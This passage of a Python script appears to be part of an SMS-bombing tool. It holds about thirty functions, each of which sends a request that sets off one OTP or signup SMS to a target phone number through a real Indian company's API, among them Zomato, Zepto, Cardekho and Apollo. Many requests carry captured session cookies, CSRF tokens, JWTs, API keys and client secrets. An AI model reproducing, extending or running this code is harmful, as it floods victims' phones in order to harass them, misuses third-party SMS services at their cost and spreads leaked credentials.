    "referer": "https://www.wakefit.co/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "mobile": number,
  "whatsapp_opt_in": 1
}

      response = requests.post(url, headers=headers,json=data)

# Cardekho App Api

def sms_85():

      url = "https://apis.cardekho.com/f8"

      headers = {
    "Host": "apis.cardekho.com",
    "secret": "626632cd9618477eee6d46e0",
    "appversioncode": "302",
    "appversion": "7.2.1.9",
    "platform": "app_android",
    "content-type": "application/json; charset=UTF-8",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.8.0",
}

      payload = {
  "variables": {
    "payload": {
      "utmParams": {
        "source": "google-play",
        "medium": "organic"
      },
      "connectoid": "7521f72d-8551-45dd-ba1f-8f4f9db8d7f2",
      "intentSource": "OnBoarding",
      "mobile": number,
      "waOtp": False,
      "platform": "app_android"
    }
  },
  "query": "mutation SendOtp($payload: UserInput!) {\n  sendOtp(payload: $payload) {\n    token\n    name\n    existingUser\n    whatsappOptIn\n    __typename\n  }\n}\n",
  "operationName": "SendOtp"
}

      response = requests.post(url, headers=headers, json=payload)

# Hyglfe App Api

def sms_86():
       
       url = "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate"
       
       data = {"mobile_number":number}
       
       response = requests.post(url,json=data)

# Abibus App Api

def sms_87():

      url = "https://www.abhibus.com/app/v72/sendOtp"

      headers = {
    "IMEI": "ecad72a394a9d9b0",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "www.abhibus.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.9.2"
}

      payload = {
  "cleverTapUserId": "__g7521f72d855145ddba1f8f4f9db8d7f2",
  "deviceToken": "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1",
  "mobile": number,
  "prd": "ANDR",
  "pushToken": "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1"
}

      response = requests.post(url, headers=headers, json=payload)

# Gozocabs App Api

def sms_88():
       
       url = "https://app.gozocabs.com/api/conapp/users/verifyUserV1"
       
       data = {
  "provider": "Gozocabs",
  "userName": number
}

       response = requests.post(url,json=data)

# Jobhai App Api

def sms_89():

      url = "https://api.jobhai.com/auth/jobseeker/v2/send_otp"

      headers = {
    "Host": "api.jobhai.com",
    "device-id": "231fd310-c1e0-45a5-a6f5-1bd1266b1150",
    "source": "APP",
    "language": "en",
    "versioncode": "210030873",
    "x-transaction-id": "JsApp-514480b4-fa8e-4220-927d-691311e74b96",
    "user-agent": "JsApp/210030873",
    "session-id": "c22c7df5-d798-4daf-a663-59c7067aeb9d",
    "referer": "https://www.jobhai.com",
    "cookie": "source=JsApp/210030873",
    "accept": "*/*",
    "accept-language": "*",
    "accept-encoding": "*",
    "content-type": "application/json; charset=utf-8",
}

      data = {"phone":number}

      response = requests.post(url, headers=headers, json=data)

# Royal App Api

def sms_90():

      url = "https://api.royalenfield.com/v3/app/sendLoginAndProfileUpdateOtp"

      headers = {
    "app_id": "2",
    "x-custom-language": "en",
    "x-custom-country": "in",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "api.royalenfield.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.2.1"
}

      payload = {
  "callingCode": "91",
  "email": "",
  "mobile": number,
  "otpExpirationTime": 30,
  "otpType": 0
}

      response = requests.post(url, headers=headers, json=payload)

# Zomato App Api

def sms_91():
       
      url = "https://accounts.zomato.com/login/phone"

      data = {
    "number": number,
    "country_id": 1,
    "lc": "030257f739274b629ff093b913e3f004",
    "type": "initiate",
    "verification_type": "sms",
    "package_name": "",
    "message_uuid": ""
}

      response = requests.post(url,data=data)

# Burger King App Api

def sms_92():
       
       url = "https://burgerking.in/api/consumer/api/v1/user/signUpWithPhone"
       
       data = {"phone_no":number,"email":""}
       
       response = requests.post(url,json=data)

# Vogo App Api

def sms_93():

      url = "https://consumer.vogorental.com/api/v1/accounts/login/"

      headers = {
    "Host": "consumer.vogorental.com",
    "content-length": "54",
    "pragma": "no-cache",
    "cache-control": "no-cache",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
    "x-app-device-model": "OPPO",
    "x-app-base-name": "base_vogo_android",
    "x-app-timestamp": "2024-01-23T08:23:58.494Z",
    "x-app-device-brand": "OPPO",
    "x-origin-request-id": "99f970de-e9d8-ae7d-8087-1de17596fa39",
    "x-app-platform": "vogo_sdk",
    "x-app-semver-version": "9.5.8",
    "x-app-base-version": "249",
    "sec-ch-ua-platform": "\"Android\"",
    "x-app-version": "958",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "platform/vogo_sdk platformVersion/1 baseName/base_vogo_android baseVersion/249 androidVersion/10 deviceBrand/OPPO deviceId/ecad72a394a9d9b0 deviceName/OPPO MOBILE LIMITED-OPPO",
    "x-app-os-version": "13",
    "content-type": "application/json",
    "accept": "application/json",
    "x-app-client": "consumer-web",
    "x-app-platform-version": "1",
    "origin": "https://app.vogo.in",
    "x-requested-with": "com.VoDrive",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://app.vogo.in/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9"
}

      data = {
  "mobile": number,
  "device_id": "ecad72a394a9d9b0"
}

      response = requests.post(url, headers=headers, json=data)

# Zepto App Api

def sms_94():

      url = "https://api.zepto.co.in/api/v1/user/customer/signup/"

      headers = {
    'accept': 'application/json',
    'access-control-allow-credentials': 'true',
    'x-requested-with': 'XMLHttpRequest',
    'sessionid': '1bbf4273e4838fb39d548b5e065137e1',
    'appversion': '24.1.2',
    'deviceuid': 'ecad72a394a9d9b0',
    'platform': 'android',
    'systemversion': '13',
    'source': 'PLAY_STORE',
    'device_model': 'Oppo',
    'device_brand': 'Oppo',
    'compatible_components': 'SAMPLING_FOR_COUPON_MOV_ENABLED,CONVENIENCE_FEE,RAIN_FEE,EXTERNAL_COUPONS,STANDSTILL,BUNDLE,MULTI_SELLER_ENABLED,PIP_V1,ROLLUPS,SAMPLING_ENABLED,ETA_NORMAL_WITH_149_DELIVERY,ROLLUPS_UOM,SAMPLING_V2,RE_PROMISE_ETA_ORDER_SCREEN_ENABLED,RECOMMENDED_COUPON_WIDGET,SMART_BASKET,NZS_CAMPAIGN_COMPONENT,ETA_NORMAL_WITH_199_DELIVERY,NEW_FEE_STRUCTURE,PHARMA_ENABLED,REWARDS_WIDGET_MISSION_V2,GAMIFICATION_ENABLED,DYNAMIC_FILTERS,HOMEPAGE_V2,COUPON_WIDGET_CART_REVAMP,AUTOSUGGESTION_PIP,NEW_ETA_BANNER,CART_TABBED_WIDGET,BPC_GROUP_DETAILS,IS_DYNAMIC_NZS_SUPPORTED,ZEPTO_THREE,RERANKING_QCL_RELATED_PRODUCTS,AUTO_COD_ORDER_ENABLED,PAAN_BANNER_WIDGETIZED,FTB_SINGLE_CLICK_COD_PAYMENT,AUTOSUGGESTION_PAGE_ENABLED,COUPON_UPSELLING_WIDGET,DELIVERY_UPSELLING_WIDGET,CART_BOX_MODEL_WIDGETS,REFERRAL_P2,PDP_TOP_PRODUCT_BANNER,AUTOSUGGESTION_AD_PIP,VERTICAL_FEED_PRODUCT_GRID',
    'storeid': 'a2af220f-8ad2-4869-abc7-62dc2476af8c',
    'tobaccoconsentgiven': 'false',
    'isinternaluser': 'false',
    'requestid': '015fb21846b25a35232a27271039c52c',
    'bundleversion': '',
    'is_new_font': 'true',
    'accept-encoding': 'gzip',
    'content-type': 'application/json; charset=utf-8',
    'content-length': '62',
    'user-agent': 'okhttp/4.9.3'
}

      data = {
  "signupType": "otp_sms",
  "data": {
    "mobile_number": number
  }
}

      response = requests.post(url, headers=headers, json=data)

# Eatsure App Api

def sms_95():

      url = "https://thanos.faasos.io/v3/customer/generate_otp.json"

      headers = {
    "Host": "thanos.faasos.io",
    "client-source": "13",
    "brand-id": "134",
    "app-version": "10244",
    "client-os": "eatsure_android",
    "content-type": "application/json; charset=UTF-8",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.10.0"
}

      data = {
  "phone_number" : number,
  "country_code" : "IND",
  "dialing_code" : "+91",
  "is_new_customer" : True,
  "communication_channel" : "sms"
}

      response = requests.post(url, headers=headers, json=data)

# Tatacliq App Api

def sms_96():

      url = "https://api.tatadigital.com/api/v2/sso/check-phone"

      headers = {
    "Host": "api.tatadigital.com",
    "client_id": "TATACLIQ-ANDROID-APP",
    "appversion": "80",
    "appplatform": "android",
    "content-type": "application/json; charset=UTF-8",
    "content-length": "56",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.11.0"
}

      data = {
  "countryCode": "91",
  "phone": number,
  "sendOtp": True
}

      response = requests.post(url, headers=headers, json=data)

# Barbeque App Api

def sms_97():
       
      url = "https://api.barbequenation.com/api/v1/generate-otp"

      headers = {
    "Host": "api.barbequenation.com",
    "bbq-client-id": "ab152980-a81b-4b99-aef9-e5786a0923f4",
    "bbq-client-secret": "zonvYz-xawgih-vodno5",
    "user-agent": "Android-ecad72a394a9d9b0",
    "content-type": "application/json; charset=UTF-8",
    "content-length": "61",
    "accept-encoding": "gzip"
}

      data = {
  "country_code": "+91",
  "mobile_number": number,
  "otp_id": ""
}

      response = requests.post(url, headers=headers, json=data)

def sms_98():
       
       url = "https://www.healthkart.com/veronica/user/validate/1/"+number+"/signup?plt=2&st=1"
       
       response = requests.get(url)

# Sirona Api

def sms_99():
       
      url = "https://acl.mgapis.com/v6/otp/generate?vendorCode=srn&countryFilter=IND&languageFilter=EN"

      headers = {
    "Host": "acl.mgapis.com",
    "Content-Length": "94",
    "Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
    "G-Recaptcha-Action": "sendOtp",
    "Sec-Ch-Ua-Mobile": "?1",
    "G-Recaptcha-Response": "03AFcWeA5KLRLbxYnTPiII_SHZuyFf85KNL-nJpWl1ekVmjt9iH-aSL1YrkoBtLH0e_k-Gs3tMxjQhFvljB4VXx85JU-EgXdE8ETEichHsrXGGWOYdQ5qqxBrlaTs1aLuAHYNvUeO1O3c41ELEPbuYvf58crIkdXA0nJqtaG3XeyfoGqEtVIX-dhoXFfoqLrriEmOYdI3Kml4sFJg3dGrkZGAbGxQZaUjANbuZfkjFODbbh5Bm0B48BrTIn3Q-VT6HHY9jSmZMn1KeSvlcdKi5CyUxDIm12ehwd5c6ro7fiH90QD3Kh43bVJu7NWpOdgpAUkx61JGhtK4xOwi2FXg2LLb3paCb2VOcXhVW0HCiiE7BOJFJmAcbcksHUA9Ls6454aymofW5KZoSfECbgWLKS2VysBheX9RClwbnQ9vrMxAWLx50X_lCs0iGFKEhLzU0_HTW4VUK47tPj1k9n8xO3WmeRfwJ7TLH2RkzL0A-FQjDMIMH16_qfFZkU9PpwkqmGxRpF1eGXOcIs7BqwhxhzXcTR0gl3hsKf4L6urPstreScgAUAn9O-JiCWZD09oTWN9fvZNP2sTna_jN2tAKyPqRguJm0CRu2r-cSD-_4hz0ccLg4UfP3N2VFtMOnM1vguo5ufiUmyjvx70psFfBtGc8nssslOnIH4zFPqXpps_rJH17rWFqBhStwhsxr-hP8mDqNmUPMPa5oRSTce11cuoBFz3xQsv6Z_JKGgRFFx25dPrsXxISZSH1lyufFRh_6VPLkkcMzUWYH-QuddP70_ySQBGVSThtMrCQWhduH498s87b1r7nsvXPal8my0ebvcijoBgxbH9vO6NBDyH-2sg1R7vlSpRY8f2phf9Bw0ZmP6nuiWigR_y8y9hmRMVNtbmSFadgsXNYDvyt3ziMENWRIj2Awjp7ou3jFTsQxetKKFl0x5Q99onKfFNpb144drfwI332asCCJ9VwKjiU4TE0f56LOsW4_UJbALP0v2hyPUBT-2nvr_f1Z2Ev998oBRSJvYLxjGgPgM16xJ4qapki711B5WnFBzmnwNkWlCGXJmWEvwr1oodCpm5pCfGb0GqcBKQwQh-wtVmKHYQY2ECo8iUlliDYsudkbuWNJX74VYrCOvwJSKUIUfb_2NKjzj-pKevBp0rEI55y_B3NjVWq2lIzO8vgOcLtwyCkXKCZCDBsrp9s_yRMse2aTeMq3myoQCdb_cBcVZWtK_f5kvkrn9psuhIuYr2uPELFPd058k-GZjU2nEYugsZKjcQ1102IXWCzMzvyJy9YSqW5BmgMjQxlEQOEn60bmPP7NvdnE1TSeOeV9FYpb149t87OzKNfsj3ZWSQozUdZ4C1sbvCMxUDZPp4JKoxbsDvT_3buMa6uYUH1j8kh3eBftMG_BUrTR5Gc42Uwz0J7ACQ6ZEF0jmtwvDtwZbdjr4TmHM3d7Fua38axcJPA7LziHrfMYhqq-4jS-wfDY1A06u1CsKs-MKYmrv8rE1VAoTMde9x--iV8mFrEwTSlHqrKNm1c1Qyz141YP0cSGZOjsajEiYmPsP2gmdoJ2SeKWz5bXizC-V5B7pjVBem0NlQVQuhQAtES5JRCrH_BJyYJTKlBbAlwQqJjSbAYM_zumhLz6vKZtValATfrt-CErS20EWibMgcVJiVpOlfh1BSA4QAoaWi1OCUOVLEH3FQ",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "ApiKey": "7f6ced1f4265ebfd4ca89a9d8a3b8bb5",
    "Sec-Ch-Ua-Platform": "Android",
    "Origin": "https://www.thesirona.com",
    "X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.thesirona.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9"
}

      payload = {
  "countryCode": "91",
  "mobile": number,
  "isWhatsAppOpted": None,
  "name": "",
  "vendorCode": "srn"
}

      response = requests.post(url, json=payload, headers=headers)

# Smytten Api

def sms_100():
       
       url = "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode"
       
       data = {
  "ad_id": "",
  "device_info": {},
  "device_id": "",
  "app_version": "",
  "device_token": "",
  "device_platform": "web",
  "phone": number,
  "email": "sanjeevkumar7@gmail.com"
}

       response = requests.post(url,json=data)

# Country Delight App Api

def sms_101():
       
       url = "https://api.countrydelight.in/api/v1/customer/requestOtp"
       
       data = {
  "device": "Android",
  "mobile_number": number,
  "mode": "SMS",
  "new_user": False
}

       response = requests.post(url,json=data)
       
# Kirana Club App Api

def sms_102():
       
       url = "https://asia-south1-op-d2r.cloudfunctions.net/sendOtp"
       
       data = {
  "data": {
    "appVersion": "5.6.0",
    "phoneNumber": "+91"+number,
    "env": "prod",
    "isResend": False
  }
}
       
       response = requests.post(url,json=data)
              
# Anytime Astrok Api

def sms_103():
       
       url = "https://www.anytimeastro.com/account/registermobile/"

       data = {
    'ContactMobile': number,
    'MobCode': '+91',
    'trackingUrl': '',
    'ReferralCode': '',
    'reCaptchaResponse': '',
    'CountryCode': 'in',
    'captchaenabled': '0'
}

       response = requests.post(url, data=data)

# Bodhi Api

def sms_104():
       
       url = "https://api.bodhiness.com/v1/users/login?defaultCurrencyType=inr"
       
       data = {
  "countryCode": "+91",
  "phoneNumber": number,
  "notifyByWhatsapp": True,
  "platform": "WEB",
  "onlyUserLogin": True
}

       response = requests.post(url,json=data)

# Astrosage Api

def sms_105():
       
      url = "https://varta.astrosage.com/sdk/registerAS"

      params = {
    'callback': 'myCallback',
    'countrycode': '91',
    'phoneno': number,
    'deviceid': '',
    'jsonpcall': '1',
    'fromresend': '0',
    'operation_name': 'blank',
    '_': '1706752236109'
}

      headers = {
    'Host': 'varta.astrosage.com',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'accept': '*/*',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'no-cors',
    'sec-fetch-dest': 'script',
    'referer': 'https://www.astrosage.com/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': 'app-install=1'
}

      response = requests.get(url, params=params, headers=headers)

# kisankonnect Api

def sms_106():
       
       url = "https://api.kisankonnect.in/api/v2/customer-masters/generate-otp"
       
       data = {"mobile_no":number}
       
       response = requests.post(url,json=data)

# Nowandme Api

def sms_107():

      url = "https://nowandme.com/api/v2/account/auth/signup/mobile"

      headers = {
    "Host": "nowandme.com",
    "content-length": "45",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "x-access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWJiMDA0ZDZiNDA0MTAwMWM4NTViYjIiLCJ0eXBlIjoiQUNDRVNTX1RPS0VOIiwiaWF0IjoxNzA2NzU0MTI1LCJleHAiOjE3MDY3NTUwMjV9.tF5nhTg24EV1o-y1K5sA7aLZgCf6SXAF1oPOzXsaP5g",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://nowandme.com",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://nowandme.com/home",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "cookie": "id=65bb004d6b4041001c855bb2; x-access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWJiMDA0ZDZiNDA0MTAwMWM4NTViYjIiLCJ0eXBlIjoiQUNDRVNTX1RPS0VOIiwiaWF0IjoxNzA2NzU0MTI1LCJleHAiOjE3MDY3NTUwMjV9.tF5nhTg24EV1o-y1K5sA7aLZgCf6SXAF1oPOzXsaP5g; ph_phc_aTBFQOq3YdSOnsHYNUPLn5DxPMHfLnZgTmVOJnn0AS7_posthog=%7B%22distinct_id%22%3A%2218d62793430a0-0f2d3fa92e989-29343166-46500-18d62793432a6%22%2C%22%24device_id%22%3A%2218d62793430a0-0f2d3fa92e989-29343166-46500-18d62793432a6%22%2C%22%24search_engine%22%3A%22google%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%2C%22%24referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24referring_domain%22%3A%22www.google.com%22%2C%22%24sesid%22%3A%5B1706754152833%2C%2218d6279344694-0e35572cd4214e-29343166-46500-18d62793447e9%22%5D%2C%22%24session_recording_enabled_server_side%22%3Atrue%2C%22%24active_feature_flags%22%3A%5B%5D%2C%22%24enabled_feature_flags%22%3A%7B%7D%7D",
}

      data = {
  "iso_alpha_2": "IN",
  "number": "+91"+number
}

      response = requests.post(url, json=data, headers=headers)

# Pandit Api

def sms_108():
       
       url = "https://product.mypandit.com/wp-json/digits/v6/signup_user_popup"
       
       data = {
    'device_id': 'web',
    'user_email': '',
    'country_code': '+91',
    'mobile_no': number,
    'device_type': 'web'
}

       response = requests.post(url,data=data)

# Inastr Api

def sms_109():

      url = "https://instaastro.com/v1/users/website-phone-login/login/"

      headers = {
    "Host": "instaastro.com",
    "content-length": "159",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://instaastro.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://instaastro.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "cookie": "csrftoken=Q6sBuwOJQb5hHfwTtY5joqvZLo4eiuo9XOL2HGZaYJYW1Rew4Lf7Z3PoYkIu6K1m"
}

      data = {
    "phone_number": "+91"+number,
    "dynamic_api_key": "aW5zdGEyMDIzd2Vi",
    "csrfmiddlewaretoken": "jfIaZnWVnBjelnt5J3yA1qtVSqfimYntqX1Bcx7mv9cTFZbIkQIoC3Nk5mTyae0D",
    "g_recaptcha": ""
}

      response = requests.post(url, headers=headers, data=data)

# Gamerji api

def sms_109():
  
       url = 'https://api.gamerji.tech/api/auth/signup'

       headers = {
    'Host': 'api.gamerji.tech',
    'content-length': '172',
    'sec-ch-ua': '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': 'application/json, text/plain, */*',
    'company-code': 'GJ',
    'user-type': 'appUser',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://web.gamerji.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://web.gamerji.com/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9'
}

       data = {
  "type": "otpRequest",
  "platform": "webapp",
  "username": number,
  "phoneCode": "+91",
  "country": "611e04284ac17121fd8b1a54",
  "code": None,
  "campaignId": "631c373b0872b0c5fec0198f"
}

       response = requests.post(url, headers=headers, json=data)

# Dunzo api

def sms_110():
       
       url = 'https://www.dunzo.com/api/v0/auth/sign-up'

       headers = {
    'Host': 'www.dunzo.com',
    'content-length': '42',
    'sec-ch-ua': '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    'correlation-id': 'ea0a57b0d19611ee8152e386977ee3ea',
    'x-app-version': '2.0.0',
    'x-csrf-token': 'B76o0OWi-WCHhX7v5M1jGdwTZ7i5Piq_Cl2M',
    'x-app-flavour': '',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'accept': 'application/json, text/plain, */*',
    'x-app-type': 'PWA',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://www.dunzo.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.dunzo.com/signin',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': 'dz_e=ZTU4M2E4NmItNzRjMy00MTdlLWE5NDgtOTFkZDQ5MzZmNTc1X3Yx; connect.sid=s%3AhUjFkxhoBGhNFGxalqSqtPWj01_LG5zQ.JscJTjiqLKNIODRONTf26j%2BI01Zvzlf6yj0tyci1n2k; WZRK_G=69bd9565a21a4a5690fcfd1b2f2ea687; __cf_bm=OakPTRpkuMAooJfjyVGVZ6tYqehZvztIlLrwtBt7_wc-1708615638-1.0-AfmKOIvWhYZYAkCIRRH/P/TOVKH8dXvTx4UBdS6tqmVCIIoIH7AjSYmhjFRbOBMmGT0BwroOyk2tG3VBOLJsdvI=; __cfruid=192d7420e886de7c1e1fb83f2e190beea99bb674-1708615638; WZRK_S_46R-KR9-WZ5Z=%7B%22p%22%3A1%2C%22s%22%3A1708615638%2C%22t%22%3A1708615643%7D'
}

       data = {
  "phone": number,
  "tos_accepted": True
}

       response = requests.post(url, headers=headers, json=data)

# Snapdl api

def sms_111():
       
       url = "https://m.snapdeal.com/signupCompleteAjax"

       data = {
  "j_password": None,
  "j_mobilenumber": number,
  "agree": True,
  "j_confpassword": None,
  "journey": "mobile",
  "numberEdit": False,
  "swp": True,
  "j_fullname": "Lucifer"
}

       response = requests.post(url,json=data)
       
# Naaptol api

def sms_112():
       
       url = "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp"

       headers = {
    "Host": "m.naaptol.com",
    "content-length": "58",
    "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    "pagesecuritytoken": "GTDE3MDg2MTcwMzNQ5MjBfbkBAcHRvbF83NTAwNDQ2NlA=R",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://m.naaptol.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://m.naaptol.com/?ntpromoid=47570&utm_source=NTV3W&utm_medium=NTV3W&utm_campaign=HINDI-PMAX-Grinder-101023-12611910&gad_source=1&gclid=EAIaIQobChMIu9GMuqa_hAMV-dYWBR2PPwYUEAAYASAAEgIhy_D_BwE",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "cookie": "JSESSIONID=server1_cookie~2EBBB2FC09B429766931C364E66CD77C.frontend_node2; NT-language=1; _ga=GA1.2.204289946.1708617037; _gid=GA1.2.8912346.1708617037; _gac_UA-1212912-1=1.1708617037.EAIaIQobChMIu9GMuqa_hAMV-dYWBR2PPwYUEAAYASAAEgIhy_D_BwE; _gat=1; CAMPAIGN_COOKIE=47570----2371; _fbp=fb.1.1708617037861.836913639"
}

       data = {"actionname":"checkMobileUserExistsForTvApp","mobile": number}

       response = requests.post(url, headers=headers, data=data)

# Udaan api

def sms_113():
       
       url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2"
       
       data = {"mobile": number}
       
       response = requests.post(url,data=data)

# Apollo api

def sms_114():
       
       url = "https://apigateway.apollo247.in/auth-service/generateOtp"

       headers = {
    "Host": "apigateway.apollo247.in",
    "content-length": "54",
    "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    "x-app-os": "web",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    "x-app-device-id": "Desktop",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "x-apollo-pre-auth-key": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGlmaWVyIjoiY2E5YTAxYjdhNDcwNDg5ZDljNzVjY2JmODgzOTUxNjk0ZDZmMGI4ODBjODdmODI5MDQzM2I2ZTEzOTc3ZmE3NSIsImlzc3VlZEF0IjoiMjAyNC0wMi0yM1QwNDo0MToxMS4xMjJaIiwiZGV2aWNlSWQiOiJEZXNrdG9wIiwiaWF0IjoxNzA4NjYzMjcxLCJleHAiOjE3MDg3NDk2NzEsImlzcyI6IkFwb2xsbzI0NyJ9.Xj1i50m3GuMQoczLi7iqIkLRT5IKvJOpEfQO92-xtegnoKPg6J3eIPyb1Z5bQgb0bzDR-gGKwvP6YwrYJWgnYIAjPP11q8jPhkeHfLlJpuiGmuvPnUNWUUJMvhbIJfOcOexr14mpvNapOCwMUDcnaTjh4pcPMdx6p-ybCUjI_Jrg2SRQiSYnvBzmW7RX1LYHTrx0KFLo-cKf3WCO4TwMS_vqYEgc_-fBc-ErXZ1rb6t7kwFU2ZxMJRno1FN_Q5Sd8iCBRRysoa7Z8Dln71-wbQKwaEK6q1x_Nz7UuuqZT1jJXpRZcmtMdLe5utHOVn01izIx5mzdmA5saRZY7AGiQA",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://www.apollopharmacy.in",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.apollopharmacy.in/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9"
}

       data = {
  "loginType": "PATIENT",
  "mobileNumber": "+91"+number
}

       response = requests.post(url, headers=headers, json=data)

# Magicpin api

